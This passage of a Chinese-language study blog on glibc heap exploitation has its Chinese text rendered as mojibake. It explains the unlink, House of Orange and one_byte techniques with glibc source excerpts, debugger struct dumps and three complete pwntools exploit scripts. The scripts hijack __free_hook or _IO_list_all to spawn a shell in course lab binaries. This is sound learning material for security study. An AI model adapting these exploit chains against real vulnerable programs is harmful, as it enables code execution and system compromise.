      if (p-&gt;fd_nextsize == p)
        fd-&gt;fd_nextsize = fd-&gt;bk_nextsize = fd;
      else
        {
          fd-&gt;fd_nextsize = p-&gt;fd_nextsize;
          fd-&gt;bk_nextsize = p-&gt;bk_nextsize;
          p-&gt;fd_nextsize-&gt;bk_nextsize = fd;
          p-&gt;bk_nextsize-&gt;fd_nextsize = fd;
        }
    }
      else
    {
      p-&gt;fd_nextsize-&gt;bk_nextsize = p-&gt;bk_nextsize;
      p-&gt;bk_nextsize-&gt;fd_nextsize = p-&gt;fd_nextsize;
    }
    }
}
</code></pre>
<h4 id="åˆ©ç”¨æ–¹æ³•"><a href="#åˆ©ç”¨æ–¹æ³•" class="headerlink" title="åˆ©ç”¨æ–¹æ³•"></a>åˆ©ç”¨æ–¹æ³•</h4><p>ä¼ªé€ ä¸€ä¸ªå‡çš„chunkï¼Œä»åˆæ³•chunkçš„ç”¨æˆ·æ•°æ®çš„ç¬¬ä¸€ä¸ªå››å­—å¼€å§‹ï¼Œå°†å…¶fdå’Œbkåˆ†åˆ«æŒ‡å‘ç”¨ æˆ·æ•°æ®æŒ‡é’ˆä¹‹å‰çš„0x18å’Œ0x10å­—èŠ‚ï¼Œå®ƒä»¬ä½äºè¯¥chunkä¸­ã€‚ä¸ºåç»­çš„æ•°æ®å—è®¾è®¡ä¸€ä¸ªprev_size å­—æ®µï¼Œæ¯”å‰ä¸€ä¸ªæ•°æ®å—çš„å®é™…å¤§å°å°‘0x10å­—èŠ‚ã€‚åˆ©ç”¨ä¸€ä¸ªæº¢å‡ºé”™è¯¯æ¥æ¸…é™¤åç»§å—çš„prev_inuseä½ï¼Œå½“è¿™ä¸ªå—è¢«é‡Šæ”¾æ—¶ï¼Œmallocå°†è¯•å›¾æŠŠå®ƒä¸å‡çš„å—å‘ååˆå¹¶ã€‚å‡çš„å—çš„fdæ‰€æŒ‡å‘çš„å—çš„bkæŒ‡å‘å‡çš„å—ï¼Œè€Œå‡çš„å—çš„bkæ‰€æŒ‡å‘çš„å—çš„fdä¹ŸæŒ‡å‘å‡çš„å—ï¼Œæ»¡è¶³äº†safe linkçš„æ£€æŸ¥ã€‚è§£é™¤é“¾æ¥è¿‡ç¨‹çš„ç»“æœæ˜¯ï¼Œå‡å—çš„æŒ‡é’ˆï¼ˆæŒ‡å‘åˆæ³•å—çš„ç”¨æˆ·æ•°æ®çš„æŒ‡é’ˆï¼‰è¢«è¦†ç›–ä¸ºè‡ªèº«çš„åœ°å€å‡å»0x18ã€‚</p>
<p><img src="Heap.assets/image-20220916182208311.png" alt="image-20220916182208311"></p>
<h4 id="ç¤ºä¾‹ä¸€-safe-unlink"><a href="#ç¤ºä¾‹ä¸€-safe-unlink" class="headerlink" title="ç¤ºä¾‹ä¸€  safe unlink"></a>ç¤ºä¾‹ä¸€  safe unlink</h4><blockquote>
<p>æ–‡ä»¶è¯¦è§<a href="attachment/safe_unlink/safe_unlink">safe_unlink</a></p>
</blockquote>
<h5 id="æ£€æŸ¥ä¿æŠ¤æªæ–½-1"><a href="#æ£€æŸ¥ä¿æŠ¤æªæ–½-1" class="headerlink" title="æ£€æŸ¥ä¿æŠ¤æªæ–½"></a>æ£€æŸ¥ä¿æŠ¤æªæ–½</h5><pre><code class="shell">â”Œâ”€â”€(fanyaã‰¿ferity)-[~/â€¦/heap/heaplab/part1/safe_unlink]
â””â”€$ checksec safe_unlink
[*] &#39;/home/fanya/Desktop/heap/heaplab/part1/safe_unlink/safe_unlink&#39;
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  &#39;../.glibc/glibc_2.30_no-tcache&#39;
</code></pre>
<h5 id="æ¼æ´åˆ©ç”¨-4"><a href="#æ¼æ´åˆ©ç”¨-4" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h5><ul>
<li>å› ä¸ºå­˜åœ¨ä¸€ä¸ª<code>m_array</code>æ¥å‚¨å­˜æ‰€ç”³è¯·çš„chunkï¼Œä»è€Œæ–¹ä¾¿unlinkçš„åˆ©ç”¨ï¼Œä»è€Œä¿®æ”¹<code>__free_hook</code>ã€‚</li>
</ul>
<h5 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h5><pre><code class="python">#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF(&quot;safe_unlink&quot;)
libc = ELF(elf.runpath + b&quot;/libc.so.6&quot;) # elf.libc broke again

gs = &#39;&#39;&#39;
continue
&#39;&#39;&#39;
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the &quot;malloc&quot; option; send size.
# Returns chunk index.
def malloc(size):
    global index
    io.send(b&quot;1&quot;)
    io.sendafter(b&quot;size: &quot;, f&quot;{size}&quot;.encode())
    io.recvuntil(b&quot;&gt; &quot;)
    index += 1
    return index - 1

# Select the &quot;edit&quot; option; send index &amp; data.
def edit(index, data):
    io.send(b&quot;2&quot;)
    io.sendafter(b&quot;index: &quot;, f&quot;{index}&quot;.encode())
    io.sendafter(b&quot;data: &quot;, data)
    io.recvuntil(b&quot;&gt; &quot;)

# Select the &quot;free&quot; option; send index.
def free(index):
    io.send(b&quot;3&quot;)
    io.sendafter(b&quot;index: &quot;, f&quot;{index}&quot;.encode())
    io.recvuntil(b&quot;&gt; &quot;)

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil(b&quot;puts() @ &quot;)
libc.address = int(io.recvline(), 16) - libc.sym.puts
io.recvuntil(b&quot;&gt; &quot;)
io.timeout = 0.1

# =============================================================================

# =-=-=- EXAMPLE -=-=-=

info(f&quot;m_array @ 0x{elf.sym.m_array:02x}&quot;)

# Request 2 small chunks.
chunk_A = malloc(0x88)
chunk_B = malloc(0x88)

# pause()
# Prepare fake chunk metadata.
fd = elf.sym.m_array - 0x18
bk = elf.sym.m_array - 0x10
prev_size = 0x80
fake_size = 0x90
edit(chunk_A, p64(0) + p64(0x80) + p64(fd) + p64(bk) + p8(0)*0x60 + p64(prev_size) + p64(fake_size))

# pause()
free(chunk_B)

edit(chunk_A, p64(0)*3 + p64(libc.sym.__free_hook - 0x8))
edit(chunk_A, b&#39;/bin/sh\x00&#39; + p64(libc.sym.system ))
free(chunk_A)


# =============================================================================

io.interactive()
</code></pre>
<h3 id="Unsortedbin-Attack"><a href="#Unsortedbin-Attack" class="headerlink" title="Unsortedbin Attack"></a>Unsortedbin Attack</h3><p><img src="Heap.assets/image-20220929171044220.png" alt="image-20220929171044220"></p>
<h3 id="House-of-Orange"><a href="#House-of-Orange" class="headerlink" title="House of Orange"></a>House of Orange</h3><pre><code class="c">struct _IO_FILE {
  int _flags;       /* High-order word is _IO_MAGIC; rest is flags. */
#define _IO_file_flags _flags

  /* The following pointers correspond to the C++ streambuf protocol. */
  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
  char* _IO_read_ptr;   /* Current read pointer */
  char* _IO_read_end;   /* End of get area. */
  char* _IO_read_base;  /* Start of putback+get area. */
  char* _IO_write_base; /* Start of put area. */
  char* _IO_write_ptr;  /* Current put pointer. */
  char* _IO_write_end;  /* End of put area. */
  char* _IO_buf_base;   /* Start of reserve area. */
  char* _IO_buf_end;    /* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */

  struct _IO_marker *_markers;

  struct _IO_FILE *_chain;

  int _fileno;
#if 0
  int _blksize;
#else
  int _flags2;
#endif
  _IO_off_t _old_offset; /* This used to be _offset but it&#39;s too small.  */

#define __HAVE_COLUMN /* temporary */
  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];

  /*  char* _save_gptr;  char* _save_egptr; */

  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};
struct _IO_FILE_complete
{
  struct _IO_FILE _file;
#endif
#if defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001
  _IO_off64_t _offset;
# if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
  /* Wide character stream stuff.  */
  struct _IO_codecvt *_codecvt;
  struct _IO_wide_data *_wide_data;
  struct _IO_FILE *_freeres_list;
  void *_freeres_buf;
# else
  void *__pad1;
  void *__pad2;
  void *__pad3;
  void *__pad4;

  size_t __pad5;
  int _mode;
  /* Make sure we don&#39;t get into trouble again.  */
  char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];
#endif
};
</code></pre>
<pre><code class="c">pwndbg&gt;  ptype /o FILE
pwndbg&gt;  ptype /o struct _IO_FILE  
/* offset    |  size */  type = struct _IO_FILE {
/*    0      |     4 */    int _flags;
/* XXX  4-byte hole  */
/*    8      |     8 */    char *_IO_read_ptr;
/*   16      |     8 */    char *_IO_read_end;
/*   24      |     8 */    char *_IO_read_base;
/*   32      |     8 */    char *_IO_write_base;
/*   40      |     8 */    char *_IO_write_ptr;
/*   48      |     8 */    char *_IO_write_end;
/*   56      |     8 */    char *_IO_buf_base;
/*   64      |     8 */    char *_IO_buf_end;
/*   72      |     8 */    char *_IO_save_base;
/*   80      |     8 */    char *_IO_backup_base;
/*   88      |     8 */    char *_IO_save_end;
/*   96      |     8 */    struct _IO_marker *_markers;
/*  104      |     8 */    struct _IO_FILE *_chain;
/*  112      |     4 */    int _fileno;
/*  116      |     4 */    int _flags2;
/*  120      |     8 */    __off_t _old_offset;
/*  128      |     2 */    unsigned short _cur_column;
/*  130      |     1 */    signed char _vtable_offset;
/*  131      |     1 */    char _shortbuf[1];
/* XXX  4-byte hole  */
/*  136      |     8 */    _IO_lock_t *_lock;
/*  144      |     8 */    __off64_t _offset;
/*  152      |     8 */    struct _IO_codecvt *_codecvt;
/*  160      |     8 */    struct _IO_wide_data *_wide_data;
/*  168      |     8 */    struct _IO_FILE *_freeres_list;
/*  176      |     8 */    void *_freeres_buf;
/*  184      |     8 */    size_t __pad5;
/*  192      |     4 */    int _mode;
/*  196      |    20 */    char _unused2[20];

                           /* total size (bytes):  216 */
                         }
</code></pre>
<pre><code class="c">pwndbg&gt; dt &quot;struct _IO_FILE&quot;
pwndbg&gt; dt  FILE
FILE
    +0x0000 _flags               : int
    +0x0008 _IO_read_ptr         : char *
    +0x0010 _IO_read_end         : char *
    +0x0018 _IO_read_base        : char *
    +0x0020 _IO_write_base       : char *
    +0x0028 _IO_write_ptr        : char *
    +0x0030 _IO_write_end        : char *
    +0x0038 _IO_buf_base         : char *
    +0x0040 _IO_buf_end          : char *
    +0x0048 _IO_save_base        : char *
    +0x0050 _IO_backup_base      : char *
    +0x0058 _IO_save_end         : char *
    +0x0060 _markers             : struct _IO_marker *
    +0x0068 _chain               : struct _IO_FILE *
    +0x0070 _fileno              : int
    +0x0074 _flags2              : int
    +0x0078 _old_offset          : __off_t
    +0x0080 _cur_column          : short unsigned int
    +0x0082 _vtable_offset       : signed char
    +0x0083 _shortbuf            : char [1]
    +0x0088 _lock                : _IO_lock_t *
    +0x0090 _offset              : __off64_t
    +0x0098 _codecvt             : struct _IO_codecvt *
    +0x00a0 _wide_data           : struct _IO_wide_data *
    +0x00a8 _freeres_list        : struct _IO_FILE *
    +0x00b0 _freeres_buf         : void *
    +0x00b8 __pad5               : size_t
    +0x00c0 _mode                : int
    +0x00c4 _unused2             : char [20]
</code></pre>
<pre><code class="c">pwndbg&gt; p _IO_list_all
$2 = (struct _IO_FILE_plus *) 0x7ffff7f775c0 &lt;_IO_2_1_stderr_&gt;
pwndbg&gt; dt &quot;struct _IO_FILE_plus&quot;
struct _IO_FILE_plus
    +0x0000 file                 : FILE
    +0x00d8 vtable               : const struct _IO_jump_t *
</code></pre>
<pre><code class="c">pwndbg&gt; dt &quot;struct _IO_jump_t&quot;
struct _IO_jump_t
    +0x0000 __dummy              : size_t
    +0x0008 __dummy2             : size_t
    +0x0010 __finish             : _IO_finish_t
    +0x0018 __overflow           : _IO_overflow_t
    +0x0020 __underflow          : _IO_underflow_t
    +0x0028 __uflow              : _IO_underflow_t
    +0x0030 __pbackfail          : _IO_pbackfail_t
    +0x0038 __xsputn             : _IO_xsputn_t
    +0x0040 __xsgetn             : _IO_xsgetn_t
    +0x0048 __seekoff            : _IO_seekoff_t
    +0x0050 __seekpos            : _IO_seekpos_t
    +0x0058 __setbuf             : _IO_setbuf_t
    +0x0060 __sync               : _IO_sync_t
    +0x0068 __doallocate         : _IO_doallocate_t
    +0x0070 __read               : _IO_read_t
    +0x0078 __write              : _IO_write_t
    +0x0080 __seek               : _IO_seek_t
    +0x0088 __close              : _IO_close_t
    +0x0090 __stat               : _IO_stat_t
    +0x0098 __showmanyc          : _IO_showmanyc_t
    +0x00a0 __imbue              : _IO_imbue_t
</code></pre>
<pre><code class="c">  for (fp = (_IO_FILE *) _IO_list_all; fp != NULL; fp = fp-&gt;_chain)
    {
      run_fp = fp;
      if (do_lock)
    _IO_flockfile (fp);

      if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)
       || (_IO_vtable_offset (fp) == 0
           &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr
                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))
       )
      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)
    result = EOF;

      if (do_lock)
    _IO_funlockfile (fp);
      run_fp = NULL;
    }
</code></pre>
<pre><code class="c">          /* Take now instead of binning if exact fit */

          if (size == nb)
            {
              set_inuse_bit_at_offset (victim, size);
              if (av != &amp;main_arena)
        set_non_main_arena (victim);
#if USE_TCACHE
          /* Fill cache first, return to user only if cache fills.
         We may return one of these chunks later.  */
          if (tcache_nb
          &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)
        {
          tcache_put (victim, tc_idx);
          return_cached = 1;
          continue;
        }
          else
        {
#endif
              check_malloced_chunk (av, victim, nb);
              void *p = chunk2mem (victim);
              alloc_perturb (p, bytes);
              return p;
#if USE_TCACHE
        }
#endif
            }
</code></pre>
<h4 id="ç¤ºä¾‹ä¸€-house-of-orange"><a href="#ç¤ºä¾‹ä¸€-house-of-orange" class="headerlink" title="ç¤ºä¾‹ä¸€  house_of_orange"></a>ç¤ºä¾‹ä¸€  house_of_orange</h4><blockquote>
<p>æ–‡ä»¶è¯¦è§ <a href="attachment%5Chouse_of_orange%5Chouse_of_orange">house_of_orange</a></p>
</blockquote>
<h5 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h5><pre><code class="python">#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF(&quot;house_of_orange&quot;)
libc = ELF(elf.runpath + b&quot;/libc.so.6&quot;) # elf.libc broke again

gs = &#39;&#39;&#39;
set breakpoint pending on
break _IO_flush_all_lockp
enable breakpoints once 1
continue
&#39;&#39;&#39;
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Select the &quot;malloc (small)&quot; option.
def small_malloc():
    io.send(b&quot;1&quot;)
    io.recvuntil(b&quot;&gt; &quot;)

# Select the &quot;malloc (large)&quot; option.
def large_malloc():
    io.sendthen(b&quot;&gt; &quot;, b&quot;2&quot;)

# Select the &quot;edit (1st small chunk)&quot; option; send data.
def edit(data):
    io.send(b&quot;3&quot;)
    io.sendafter(b&quot;data: &quot;, data)
    io.recvuntil(b&quot;&gt; &quot;)

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil(b&quot;puts() @ &quot;)
libc.address = int(io.recvline(), 16) - libc.sym.puts

# This binary leaks the heap start address.
io.recvuntil(b&quot;heap @ &quot;)
heap = int(io.recvline(), 16)
io.recvuntil(b&quot;&gt; &quot;)
io.timeout = 0.1

# =============================================================================

# =-=-=- EXAMPLE -=-=-=

# Request a small chunk.
small_malloc()

# Edit the 1st small chunk.
edit(b&quot;Y&quot;*24+p64(0x1000 - 0x20 + 1))
large_malloc()
# edit(b&quot;Y&quot;*24 + p64(0x21) + p64(0))
# edit(b&quot;Y&quot;*24 + p64(0x21) + p64(0) + p64(libc.sym._IO_list_all - 0x10))
# small_malloc()

# IO_FILE
flags = b&quot;/bin/sh\x00&quot;
size = 0x61
fd = 0
bk = libc.sym._IO_list_all - 0x10

write_base = 0x1
write_ptr = 0x2
mode =  0x0
vtable_ptr = heap + 0xd8
overflow = libc.sym.system

fake_io_file = flags + p64(size) +\
    p64(fd) + p64(bk) +\
    p64(write_base) + p64(write_ptr) +\
    p64(0)*18 + p32(mode) + p32(0) +\
    p64(0) + p64(overflow) +p64(vtable_ptr)


edit(b&quot;X&quot;*16 + fake_io_file)

small_malloc()

# =============================================================================

io.interactive()
</code></pre>
<h4 id="ç¤ºä¾‹äºŒ-one-byte"><a href="#ç¤ºä¾‹äºŒ-one-byte" class="headerlink" title="ç¤ºä¾‹äºŒ one_byte"></a>ç¤ºä¾‹äºŒ one_byte</h4><blockquote>
<p>æ–‡ä»¶è¯¦è§ <a href="attachment%5Cone_byte%5Cone_byte">one_byte</a></p>
</blockquote>
<h5 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h5><pre><code class="python">#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF(&quot;one_byte&quot;)
libc = ELF(elf.runpath + b&quot;/libc.so.6&quot;) # elf.libc broke again

gs = &#39;&#39;&#39;
continue
&#39;&#39;&#39;
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the &quot;malloc&quot; option.
# Returns chunk index.
def malloc():
    global index
    io.sendthen(b&quot;&gt; &quot;, b&quot;1&quot;)
    index += 1
    return index - 1

# Select the &quot;free&quot; option; send index.
def free(index):
    io.send(b&quot;2&quot;)
    io.sendafter(b&quot;index: &quot;, f&quot;{index}&quot;.encode())
    io.recvuntil(b&quot;&gt; &quot;)

# Select the &quot;edit&quot; option; send index &amp; data.
def edit(index, data):
    io.send(b&quot;3&quot;)
    io.sendafter(b&quot;index: &quot;, f&quot;{index}&quot;.encode())
    io.sendafter(b&quot;data: &quot;, data)
    io.recvuntil(b&quot;&gt; &quot;)

# Select the &quot;read&quot; option; read 0x58 bytes.
def read(index):
    io.send(b&quot;4&quot;)
    io.sendafter(b&quot;index: &quot;, f&quot;{index}&quot;.encode())
    r = io.recv(0x58)
    io.recvuntil(b&quot;&gt; &quot;)
    return r

io = start()
io.recvuntil(b&quot;&gt; &quot;)
io.timeout = 0.1

# =============================================================================
chunk_A = malloc()
chunk_B = malloc()
chunk_C = malloc()
chunk_D = malloc()
chunk_E = malloc()

# overlap
edit(chunk_A, b&#39;Y&#39;*88 + p8(0xc1))

# leak libc
free(chunk_B)
chunk_B = malloc()

data = read(chunk_C)
unsortedbin_address = u64(data[:8])
info(f&quot;unsortedbin_address -&gt; {hex(unsortedbin_address)}&quot;)
libc.address = unsortedbin_address - 0x58 - libc.sym.main_arena
info(f&quot;libc base -&gt; {hex(libc.address)}&quot;)

# leak heap
chunk_C2 = malloc()
free(chunk_A)
free(chunk_C2)

heap = u64(read(chunk_C)[:8])
info(f&quot;heap base -&gt; {hex(heap)}&quot;)

# unsortedbin
chunk_C2 = malloc()
chunk_A = malloc()
edit(chunk_A, b&quot;Y&quot;*88 + p8(0xc1))
# edit(chunk_A, b&quot;Y&quot;*88 + p8(0x68))
free(chunk_B)
chunk_B = malloc()

# unsortedbin again and IO_File
edit(chunk_B, p64(0)*10 + b&#39;/bin/sh\x00&#39; + p8(0xb1))
edit(chunk_C, p64(0) + p64(libc.sym._IO_list_all - 0x10) + p64(1) + p64(2))
edit(chunk_E, p64(libc.sym.system) + p64(heap + 0x178))

malloc()

#  =============================================================================

io.interactive()
</code></pre>
<h3 id="House-of-Spirit"><a href="#House-of-Spirit" class="headerlink" title="House of Spirit"></a>House of Spirit</h3><h3 id="House-of-Lore"><a href="#House-of-Lore" class="headerlink" title="House of Lore"></a>House of Lore</h3><h3 id="House-of-Einherjar"><a href="#House-of-Einherjar" class="headerlink" title="House of Einherjar"></a>House of Einherjar</h3><h3 id="House-of-Rabbit"><a href="#House-of-Rabbit" class="headerlink" title="House of Rabbit"></a>House of Rabbit</h3><h3 id="Poison-Null-Byte"><a href="#Poison-Null-Byte" class="headerlink" title="Poison Null Byte"></a>Poison Null Byte</h3><h3 id="Tcache-Dup"><a href="#Tcache-Dup" class="headerlink" title="Tcache Dup"></a>Tcache Dup</h3><h2 id="Refer"><a href="#Refer" class="headerlink" title="Refer"></a>Refer</h2><ul>
<li><p><a href="https://www.udemy.com/">Udemy</a></p>
<ul>
<li><a href="https://www.udemy.com/course/linux-heap-exploitation-part-1/">Linux Heap Exploitation - Part 1</a></li>
<li><a href="https://www.udemy.com/course/linux-heap-exploitation-part-2/">Linux Heap Exploitation - Part 2</a></li>
<li><a href="https://www.udemy.com/course/linux-heap-exploitation-part-3/">Linux Heap Exploitation - Part 3</a></li>
</ul>
</li>
<li><p>source code</p>
<ul>
<li><a href="https://www.gnu.org/software/libc/">glibc code</a></li>
</ul>
</li>
<li><p><a href="www.52pojie.cn">å¾çˆ±ç ´è§£</a></p>
<ul>
<li><a href="https://www.52pojie.cn/home.php?mod=space&uid=1573412&do=thread&view=me&from=space">å‘†æ¯›ç‹ä¸å’–å–±æ£’</a></li>
<li></li>
</ul>
</li>
<li><p>self blog</p>
<ul>
<li><a href="https://hack1s.fun/">RIVER LI</a></li>
</ul>
</li>
<li><p>github blog</p>
<ul>
<li> <a href="https://nightrainy.github.io/2019/05/06/glic%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">çŸ¥ä¸–-glbicå†…å­˜ç®¡ç†å­¦ä¹ ç¬”è®° </a></li>
</ul>
</li>
<li><p><a href="https://bbs.pediy.com/">çœ‹é›ªè®ºå›</a></p>
<ul>
<li><a href="https://bbs.pediy.com/thread-262424.htm#msg_header_h2_3">Largebin attackæ€»ç»“</a></li>
</ul>
</li>
<li><p><a href="https://blog.csdn.net/">CSDN</a></p>
<ul>
<li><a href="https://blog.csdn.net/qq_41202237/category_10328044.html">hollk-å †æº¢å‡º</a></li>
<li></li>
</ul>
</li>
<li><p><a href="https://www.cnblogs.com/">åšå®¢å›­</a></p>
<ul>
<li><a href="https://www.cnblogs.com/luoleqi/p/11801400.html">Pwnki-Linuxå †çš„ä¸€äº›åŸºç¡€çŸ¥è¯†</a></li>
<li><a href="https://www.cnblogs.com/luoleqi/p/15520621.html#malloc_consolidatemstate-av">Pwnki-glibc 2.31 mallocä¸free æºç åˆ†æ</a></li>
</ul>
</li>
<li><p>æ–‡æ¡£</p>
<ul>
<li><a href="attachment%5Creport%5Cglibc%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86ptmalloc%E6%BA%90%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90.pdf">ååº­å¸ˆå‚… - glibcå†…å­˜ç®¡ç†ptmallocæºä»£ç åˆ†æ</a></li>
</ul>
</li>
</ul>
